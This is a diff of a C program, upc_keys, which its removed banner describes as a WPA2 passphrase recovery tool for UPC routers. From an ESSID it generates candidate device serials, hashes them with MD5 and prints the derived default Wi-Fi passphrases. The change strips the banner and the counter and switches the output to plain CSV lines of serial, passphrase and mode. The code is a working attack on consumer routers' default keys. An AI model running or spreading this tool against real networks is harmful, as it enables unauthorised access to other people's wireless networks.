@@ -98,22 +98,10 @@ uint32_t upc_generate_ssid(uint32_t* data, uint32_t magic)
 	return b - (((b * MAGIC2) >> 54) - (b >> 31)) * 10000000;
 }
 
-void banner(void)
-{
-	printf(
-		"\n"
-		" ================================================================\n"
-		"  upc_keys // WPA2 passphrase recovery tool for UPC%%07d devices \n"
-		" ================================================================\n"
-		"  by blasty <peter@haxx.in>\n\n"
-	);
-}
-
 void usage(char *prog)
 {
-	printf("  Usage: %s <ESSID> <band>\n", prog);
-	printf("   - ESSID should be in 'UPCxxxxxxx' format\n");
-	printf("   - band should be either '24' for 2.4GHz or '5' for 5GHz\n\n");
+	fprintf(stderr, "  Usage: %s <ESSID>\n", prog);
+	fprintf(stderr, "   - ESSID should be in 'UPCxxxxxxx' format\n\n");
 }
 
 int main(int argc, char *argv[])
@@ -123,10 +111,8 @@ int main(int argc, char *argv[])
 	char serial_input[64];
 	char pass[9], tmpstr[17];
 	uint8_t h1[16], h2[16];
-	uint32_t hv[4], w1, w2, i, cnt=0;
+	uint32_t hv[4], w1, w2, i;
 	int mode;
-
-	banner();
 
 	if(argc != 2) {
 		usage(argv[0]);
@@ -156,8 +142,6 @@ int main(int argc, char *argv[])
 		if (mode != 1 && mode != 2) {
 			continue;
 		}
-
-		cnt++;
 
 		sprintf(serial, "SAAP%d%02d%d%04d", buf[0], buf[1], buf[2], buf[3]);
 		memset(serial_input, 0, 64);
@@ -193,10 +177,8 @@ int main(int argc, char *argv[])
 		MD5_Final(h2, &ctx);
 
 		hash2pass(h2, pass);
-		printf("  -> WPA2 phrase for '%s' = '%s',%d\n", serial, pass, mode);
+		printf("%s,%s,%d\n", serial, pass, mode);
 	}
-
-	printf("\n  \x1b[1m=> found %u possible WPA2 phrases, enjoy!\x1b[0m\n\n", cnt);
 
 	return 0;
 }
